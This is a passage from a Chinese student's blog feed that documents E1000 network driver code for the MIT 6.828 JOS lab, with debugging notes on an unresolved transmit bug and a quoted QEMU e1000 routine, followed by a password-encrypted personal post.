*pcif)</span>;</span><br></pre></td></tr></tbody></table></figure><p>填入pci_attach_vendor数组中,这样E1000可以被识别.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> <span class="title">pci_attach_vendor</span>[] =</span> {</span><br><span class="line">{PCI_E1000_VENDOR_ID,PCI_E1000_DEVICE_ID,e1000_attach},</span><br><span class="line">{ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="Memory-mapped"><a href="#Memory-mapped" class="headerlink" title="Memory-mapped"></a>Memory-mapped</h5><blockquote><p>Software communicates with the E1000 via memory-mapped I/O (MMIO).</p></blockquote><p>mmio_map_region的实现在lab4中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* e1000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">e1000_attach</span><span class="params">(<span class="keyword">struct</span> pci_func *pcif)</span></span><br><span class="line">{</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line"></span><br><span class="line">    e1000 = mmio_map_region(pcif-&gt;reg_base[<span class="number">0</span>],pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    cprintf(<span class="string">"Device e1000 attached, status:%p\n"</span>,*(<span class="type">uint32_t</span>*)(e1000+<span class="number">8</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Transmitting-Packets"><a href="#Transmitting-Packets" class="headerlink" title="Transmitting Packets"></a>Transmitting Packets</h4><h5 id="C-Structures"><a href="#C-Structures" class="headerlink" title="C Structures"></a>C Structures</h5><p>加上e1000设备的初始化操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_tx_desc</span> <span class="title">tds</span>[<span class="title">NTRANS_DESC</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">e1000_attach</span><span class="params">(<span class="keyword">struct</span> pci_func *pcif)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line"></span><br><span class="line">    e1000 = mmio_map_region(pcif-&gt;reg_base[<span class="number">0</span>],pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    cprintf(<span class="string">"Device e1000 attached, status:%p\n"</span>,*(<span class="type">uint32_t</span>*)(e1000+E1000_STATUS));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAL) = PADDR(tds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDLEN) = TDLEN;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TCTL) = E1000_TCTL_EN|</span><br><span class="line">                                    E1000_TCTL_PSP|</span><br><span class="line">                                (E1000_TCTL_COLD&amp;(<span class="number">0x40</span>&lt;&lt;E1000_TCTL_COLD_SHIFT));</span><br><span class="line">                                </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TIPG) = <span class="number">10</span> | (<span class="number">8</span> &lt;&lt; <span class="number">10</span>) | (<span class="number">12</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">tdh</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">tdt</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tds_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NTRANS_DESC;++i)</span><br><span class="line">    {</span><br><span class="line">        tds[i].addr = PADDR(tdbufs[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAL) = PADDR(tds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDLEN) = TDLEN;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TCTL) = E1000_TCTL_EN|</span><br><span class="line">                                    E1000_TCTL_PSP|</span><br><span class="line">                                (E1000_TCTL_COLD&amp;(<span class="number">0x40</span>&lt;&lt;E1000_TCTL_COLD_SHIFT));</span><br><span class="line">                                </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TIPG) = <span class="number">10</span> | (<span class="number">8</span> &lt;&lt; <span class="number">10</span>) | (<span class="number">12</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(nbytes&gt;DESC_BUF_SZ)</span><br><span class="line">        panic(<span class="string">"tx_pkt: invalid packet size\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((tds[tdt()].cmd&amp;E1000_TXD_CMD_RS))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(!(tds[tdt()].status&amp;E1000_TXD_STAT_DD))</span><br><span class="line">        {</span><br><span class="line">            cprintf(<span class="string">"tx_pkt: the transmit queue is full,please retry\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> -E_TDQ_FULL;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">memcpy</span>(tdbufs[tdt()],buf,nbytes);</span><br><span class="line">    tds[tdt()].length = (<span class="type">uint16_t</span>)nbytes;</span><br><span class="line">    tds[tdt()].cmd |= (E1000_TXD_CMD_RS|E1000_TXD_CMD_EOP);</span><br><span class="line">    tds[tdt()].status &amp;= (~E1000_TXD_STAT_DD);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = (tdt()+<span class="number">1</span>)%NTRANS_DESC;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="Part-B-Receiving-packets-and-the-web-server"><a href="#Part-B-Receiving-packets-and-the-web-server" class="headerlink" title="Part B: Receiving packets and the web server"></a>Part B: Receiving packets and the web server</h3><p>和Transmit packets类似,查手册写就行了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rx_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NRECV_DESC;++i)</span><br><span class="line">    {</span><br><span class="line">        rds[i].addr = PADDR(rdbufs[i]);</span><br><span class="line">        rds[i].status &amp;= ~E1000_RXD_STAT_DD;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RAL) = MAC_IPL;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RAH) = MAC_IPH|E1000_RAH_AV;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">128</span>;++i)</span><br><span class="line">        ((<span class="type">uint32_t</span>*)(e1000+E1000_MTA))[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDBAL) = PADDR(rds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDBAH) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDLEN) = NRECV_DESC*DESC_BUF_SZ;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDT) = NRECV_DESC<span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RCTL) = (E1000_RCTL_EN | E1000_RCTL_SECRC | E1000_RCTL_BAM | <span class="number">0</span>&lt;&lt;RCTL_BSIZE_SHIFT) &amp; (~E1000_RCTL_LPE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> max_bytes)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> next = (rdt()+<span class="number">1</span>)%NRECV_DESC;</span><br><span class="line">    <span class="keyword">if</span>((rds[next].status&amp;E1000_RXD_STAT_DD)==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -E_RDQ_EMPTY;</span><br><span class="line">    <span class="type">uint16_t</span> lenth = rds[next].length;</span><br><span class="line">    <span class="keyword">if</span>(lenth&gt;max_bytes)</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,rdbufs[next],lenth);</span><br><span class="line">    rds[next].status &amp;= (~E1000_RXD_STAT_DD);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDT) = next;</span><br><span class="line">    <span class="keyword">return</span> lenth;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>其他代码详见github.<br>通过所有测试.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141920905.png"></p><p>现在启动httpd server,在浏览器中访问html页面(正好桌面上有这个html及css等文件,就拿来实验了,这是我曾经的一次作业,你可以通过这个页面猜到,我最终没有通过考试),可以看到这样的界面.<br>你可以看到有张只有一小半的BUPT校徽,<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141954122.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141744741.png"></p><p>我尝试输出字节数的方式来探究其只有一小半的原因.发现确实未发送完全.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141751103.png"></p><p>我启动e1000的调试功能,多次实验发现在第125次发送时稳定触发,与TX描述符个数无关,更奇怪的时,触发之后125,126,127还能够继续传输,并且再次触发.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311142017469.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311142036889.png"></p><p>我在课程提供的qemu的源码中找到了这一报错,它意味着e1000正在发送的描述符的buffer_addr为空,但我找不出原因,我的初始化工作和其他工作看起来没有问题,至少不太可能出现buffer_addr为空的问题.我不确定是否是课程提供的qemu存在的问题,该问题会在以后的开发中再来解决,毕竟计算机网络方面的知识我还所知甚少,近期的开发会先从JOS一些实现的优化开始.</p><p>如果您知道问题出在哪里,请联系我,感激不尽.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc.buffer_addr) {</span><br><span class="line">    <span class="keyword">if</span> (desc_offset &lt; size) {</span><br><span class="line">        <span class="type">size_t</span> iov_copy;</span><br><span class="line">        hwaddr ba = le64_to_cpu(desc.buffer_addr);</span><br><span class="line">        <span class="type">size_t</span> copy_size = size - desc_offset;</span><br><span class="line">        <span class="keyword">if</span> (copy_size &gt; s-&gt;rxbuf_size) {</span><br><span class="line">            copy_size = s-&gt;rxbuf_size;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">do</span> {</span><br><span class="line">            iov_copy = MIN(copy_size, iov-&gt;iov_len - iov_ofs);</span><br><span class="line">            pci_dma_write(d, ba, iov-&gt;iov_base + iov_ofs, iov_copy);</span><br><span class="line">            copy_size -= iov_copy;</span><br><span class="line">            ba += iov_copy;</span><br><span class="line">            iov_ofs += iov_copy;</span><br><span class="line">            <span class="keyword">if</span> (iov_ofs == iov-&gt;iov_len) {</span><br><span class="line">                iov++;</span><br><span class="line">                iov_ofs = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">while</span> (copy_size);</span><br><span class="line">    }</span><br><span class="line">    desc_offset += desc_size;</span><br><span class="line">    desc.length = cpu_to_le16(desc_size);</span><br><span class="line">    <span class="keyword">if</span> (desc_offset &gt;= total_size) {</span><br><span class="line">        desc.status |= E1000_RXD_STAT_EOP | E1000_RXD_STAT_IXSM;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* Guest zeroing out status is not a hardware requirement.</span></span><br><span class="line"><span class="comment">           Clear EOP in case guest didn't do it. */</span></span><br><span class="line">        desc.status &amp;= ~E1000_RXD_STAT_EOP;</span><br><span class="line">    }</span><br><span class="line">} <span class="keyword">else</span> { <span class="comment">// as per intel docs; skip descriptors with null buf addr</span></span><br><span class="line">    DBGOUT(RX, <span class="string">"Null RX descriptor!!\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如果有一天</title>
      <link href="/2023/Life/"/>
      <url>/2023/Life/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="43c933f00e1e89fadb19d32a20f08aefaee9646e275b4e96350327361b3c84be">b11681a661dd0610208792ae45d3d98af6726b730b6bfbefc8e1d90864c429facc81a7ab4ae973096152d2a794ead2afc8fc15baf6f8c5151928c198cc68eef4b81309a508e2d7e7d8f19675263c48edc7be2ca789995afbf8247dca5601cfcd476353eecf485cefbce4d1730d73e62d52680eae68ef0b619a24a3c6f173d2b7fdb0f368503d9808aa80caf800a07558066eb0be0986ef8bc770fd03710e4cf2442596ef1372116293a757c8ff602c8a230ac272eedac97440f682fb87ef899ec9176c75964ce1c656273609a60319b7c3919837d4225516c1d86403200a80ea2831bd4c9c7c23ddc1cf66649681d7fea5f547ca04ceae6146193e6dda4907c8eb7f17512f6f4c6f69f6e54d1a3be3ca879d38c26429d599071e1e80bb0c517503cef0df9021286756b07e0bda2661554ac48588b5e1f6fae73ac348eaba00165fae3caa1ccc4ae6e1a04612a9a2a68c77877d15f4f42f73a445334658d5fa8b098442d621079a07392fc19f688921cf213d84cf5f65d6b5950b0a4fe1543a240d358da39ed9cab03549c97b66b344883de31dd92e3e79a998e45f121eeff08c071649b952835d1ffed7965a8403ec10375fd120765d9d934530aeb0da4d9963c95d5be3a67f4abe50c80bdfefdf8396228fd71aa48f097a4d6b9df1d7473ce0c1658b3f913dfe40942366a8687c856996bcc43e1ee62ad35d3650d41459a2351a89f5c577ac69a0517b0584159d3c8de60cc40e1fc6e67c41217f8e2547f1ee7e557451d4ad69eb2b5aa25d635d5fc7853d86c1dcece07b2186fa1b73246a51533b21476b56e6b81cb28a8f2d5152e2922937b2406981e79ee41480c9efb1cdf79fd2223e6f64b830af29d827002b0272557949ac5a7cbebee816499d931bb596814aed2e0341cce19ea6f4eda6e4b672cce5ddde7b43a2f1a5ef2a5711e5bb29ac3571afe9572575e9ecf78ac4aa1bcc49283c8a3d44cc711605c909f2da4416fd6fc980defe63a22b536c6398e046ef9785c528083e9a911e85c8af13f1b961aea1c4de161e4dba93add2effa77193c0af71125c8055d4619fed2b18726689ff697e06601602a1e04c3d73bd9a1eb1e46006e1079d86c4fbec449e910eaa86da563c5e384fc29e51fe108ca052f6ff2dc5d233c3f90566c53df830d154b5d074056efca1bf68aca9c81c1aa41504ecf17b416072c6fda17acc84822670fe5759bb4d810c4362db8eccf2eb079e0c970005076520a6d38251839b5ebb1407084018c7b28e725f90e224ab7fa9f29504e0bc4bed7f44104099b89c7002bea28e9358fa945a793404be340ca148229dac212e7b709109ec01766d3658dbfc029207252535f4a56f1cdc5ad3a67294a725518ad1dcd14afc9df4885f6cd460b1b443de60c9d3a88d7a1d70ef13149f7dba3c1da62511049587c6369a9d5d86a337dd0ec23f7e0e21cec6f01ba29fb19e172b9d9ae5c8efcfadd21ed6f039140e0eef0355660aa58f6c21a4b6e30f929fb9e9e05caeb42918ab4a04e26ece8428a7110499c2c0b41fee4557de1e65590db55b3322553deae0c8aca6ce136542d001fe408b88054c4fa5351a154e2774c0b784d294007ebf57528deb29e744c55b24ef8d0fb5dedeb29d716c3ca5b80eca2cd42b3811526d1158ce75eb00518e5f6affa74311f917041fe8dd05bc2f348ba97dabd4503aa8992f6e0f32d14f430e1d22605420b478cfe71324436041cbd6cb11e1a572599d219e6158fb16119c538c89e1abf0045deb776b3d41bc707b078ffe68cf9284eaa37484e5472e04cf6a4dac9cca7a35a575f89698210499803788f70d7d1948a638a8334d33a44a0addde7d5afeabe5fcc574392cb36edb5aaf139e109d6b9a6bf1ef4fafb1ef858a5257ba323b74e638f114809f766cb6c5c44a3c975929e855ad2ecad46df989f5ffcb312af01ab9d1074b715c996cb325424466f35a9b9fe83becdbb3db8eecb9d9c22dd81d81126f4d73c1e853b190af091aa5cb01a787fe8d672af1457165d5d9b9ec711889bb73b67949af3ae8aeb52027c932b6e97238b9e4edbaf0a3ef58d7f9279aa78643cb6beb0af23737084cdd2a565cbc3e7847a89f370ba138142bd5baf27fd7e0727a43eaed311c657776e9580cb50c2a7a21c96857bc59a8acfdb04e74b99cb98b5bb59442bbe8ab5888c92bddf05fe660dafb39f56835f8d43cd870409989d6bfd70b2f848eedad6cc0bfdde3dc240d4d70402df5fb9cc97cc56c732aa7f571af6b27d4dd1b3c10df2197be7b248491cd85d2bbf666080652e2b1e4df5aa1439546892895054b880196c414815fb1f21c24a900a8b4cb7c23f14dcba5720b5d56138c06ee499d7d4739528de0506acbad5696a481ac876579d18dab842d8e1df0f0547c6edca8a6203cb2c05d3e93650394d5e2a6c2e56fde54cc45f84ef6b47e30881599db9ae6e5860f0593bf42c4a61a50dd2ff7a77e82c066a8e863c7f13769d209b5cc78f0969707c1a8610c8c16f9078ba899d76df22c0697bc8488148b8b9db70b1cab7b862a4fe828697ac29d361ad2f647680832978f91fb9f30cdfd5472f7281b773e3cf39e27270406fc31cb20d4c6d98a68022bea21a7db6e848998b65f616d23e585e3d890a3ed350b912b16af4635071f885196a9ce1120cad3dcef60787b54dcfd589101c36850221e8eee245deeb65faeade7180d8bc1d9ac88c412b02c239fde1c69192625fd4bbcff56369f33da6390746e717eaaa425882393b856d91beab1c08530962a6db869f1fc32804e3843eb900a47d0fb99dc96c54e818a0c57b2261f4ec36a6871e4f2c434aa71fc99ae425d91d3dd6905a605477ff231f33efbb9088ac1ed8caf032f20bf038c1ab83f24d99c117552c4b6124e0408ba442ad77678841f6b4a07d80be336958f257d52f715133c94009579412c8d9c7c21f8cd5548382fcd25bb6bab566f965d2ebc6d705446b0c5b915dbf4369bcd7f1d4110cfce7d6967d0f7593fc684857db611758c2a70360397cc3d47fc7e1e8a224f4a223863afaf8f5e1c8af085a642a005d3c4bc26a8f3f1431876384fc53fd3479e17addc09d99119061a68d753e8e3da121c4ba9ad84036ef52d7709c1f93732cebe2fee00f26aa6e0a6311f42ba4bffcc70fbaf2ef09636d337e900bd9e2500b8aa9c560e0567cfe1116c95948faa0b59fb9ff6e09fdaf2d2debfbb2d413f01b57580a68bfefdbfcd8c36ca3711dd4b241fb9c4684293e33ce8a106bc3502643b347d2c1b008ef2610d23e188602875305a7b6e557d75d8c2c354a2a92f8b59c1a5c8230f1e5d020045951ff34b910fd4046a5479a2f1338b77a1d01b5eaa7018059337527709c59ec98b11453b5cd947c4b1c36d564d470cd6fc98268947dc17bea98cb7b18bd6b4c824d729ed7f7af1267ff50926a7500a50f11508f7fb2bb6e107b17a654c11ce2c532d6fc00fafc1e55906fe57afa526dbb391490c1c4829ced839cfe2fb516758883caf877ad0735082e922a9480241f4aff56b80f722fe925b5d13ba6007346313fb9a3c0f627af553691a358ddbbcb36411e3c3f2a9408f25ab3db571b3868220eac9df30455e09c5a757ab6f96f492aefde79d8124ea6b084fc2c13dafd67995a7844c568d1675357cdaac67f117906e40bc1504ebb3fe5ef7b4131bd429be009955d1b49687fa34e7a8b12c30de2f13c2560b538a2ab53a9a0618f15fd69c7e9348d2f66ef496fe3524f2f99a71653aafa6436a1a9ef6d3ce13994c16866793ea325e2ab8fc243576bbbaab44bd97d27c461beb8b413d51597808aeca69d64fd5623ee0a76407ca6a8ce21f3b80d8320caf0027722b3e37fb41c8ec9bda34b46cefddd26b7bd2e267bc7e3de14f63b883fde5adcc30516e9a9da62bb791c7ad7c71a6d6d609557d1b83d2a2418d6b977e5608cf9d306590a2a61049796ba7a899164d61c7e4c9b17d9de1c495627fd28c06ae681358dc76fc6cd7bb6da031ec1ed91cfc4bc9fc617044863da44d52d7511aa38d5240cd07289b5a32105c243be1479881116a61381b1d764377cdc213edef9f6b83bebfbe458b4f9f0fc0628a47f79b45a8dbfe6beede23353d8212ee9e9f28859c645451d5e8b3bc44fad270e4c634008299f7359d3b34962e0d006e718304b65b7066888ff89765e918e5c0c9ba04282e6b3d034ca41219ae49b1f09f8e0396fb92f56a39e2f2e4a0fc8a09a101093d967a878bbc0c4c5efb945139f3f887cc4b308b299aa7ef1640fc207bcab981fdc9a738142f19f7f386bb46f043f962b800531626091dc9471b92cf9384aa5392df3c55ab4af6bae0ee00936daf2e36d9d142c7de034ce16dac0b37658a2ee9c722edfbb859c3618d6f1e304e37b98495f830529b9081a64589a1a1fe511db090cb5b06fbf5afce4f579dd51f5b8052ffb55ce25c7d9f968c07fa71d963181339b70034bc65b0b1d604d474f46da43bd826d04f06495d2b2e6073a31cb817c3e08e903362f49d0ed3247445967e58746d700abd5ef51f57b0183a50fe93d93c5224a8dbaa457a98ca9e4018289a46657bb7fa9a7f752234595e99240065c86c8c2958e524ad049056483481fa45d214956062fef93e33121bc1e15996c3558961944ba9d887fc103b2b56b7df48681e2b296605259b7d5cc3edc207f0e55d71b2c4cc05e0d3cc3f80eeba57ef707258148f58bb3ac61f5f495d9a0104faa87b935bb4052cd9fc94f3bd864fbc5444d7ce5181bb29b7f7b1ea79f673e5090e266c29cc33e57b4dded5f50c35a969ea6176e8b53745b6692aa6fb62d9e90e0d490657bf7a89bfddd684423062fa8d4fd7efb5273ea78577541f6be9d009f1ab215486b7e2ba52a6136f845aad7c09aa5fb2f5350c37ef096aa9faa03121cd9ed1846794fd584fe4040887cd5f63db0119ae42e0d504d442727f6e0ed567565ffdb48b094b75190a90c2e405581d5f9e00adce0ee5d61009ae3f16067cf08187e887fe8623cf8fcbb65d13c5a71adb82297d2ab5bd93c8b730165d1e22679fa0aa354ea4ba42b2eae818685fe1abfdd180de96d33e95fa0cae6c9d99cd76a07ffaf836a3cc961331f08854f75ed13a488ffa894dbc5b47a36fc8f51cadcc6a90660c22a783aa362f78838544e0f6625f7fd75d8d32c6d268d1f0e346850b041fb59aaedd08af106e969008e331ad18f2ddbf7bc50f020e6df4175ccdda9bda0ee1867a199f178256c2dc7171df9f2d735a5a4f5cf53b1e562b52a0171b9d009b3527d51b15000fac2c6377adb68204b5544bffbeda5524baaa547828a1c1e26d6226b98528c84b5b396609610907f434efd183e900cf45df4831f91cc8e0ff8e1730aad225688798707962a63e0a1feac88dad02e028ef5947a22e6133807fc802d9e00f0dc329aa87a6a53bf84f6da5d79622d0e634ba43dc034acbd77996b29ee7202de262b46a3db99237a84e8878ac143389a382bed1bf52936f6b2e79b75b7fbfa5a7eebd417ada0ae3fed9f761d2e3b32be319b879eb83bb91c67431a84fbbdca9c5990312591b1c07946c820433758c2fa5645daf87db48777b1ee77e5c4216702799e02b93a5ed1f85b06f42428c85e73ea4aff0070a96af0670b252e7f94e361d0d090682d49f6b167a38b7e1930d9bcb1dd23afc7d04a6c1bbff809e8f2f01ab34a164b3ed1a5357a3930acb9c68a890c14dfb2c7492ef38b16bdd76fe6f5b85587f7737ba095dbef344c4bc002489c5e5fa01b43732582f299f8076ee9fb55d9f998e12bc1766f09d338379865c6e0612976601e9d6e4889a99a87e81b315f92bfb85833e875a2c9d97d4a41f1f5481428ac12a51c4035c9ff9cbea1a1343bf16d8e8b998e6e2ce113162392906535951ed744a1fcc8c98ab26549340518ddb7c9869369e4c01ee7277eb04bc59edf1fb02c33e7f4669bc35158d2fe70b4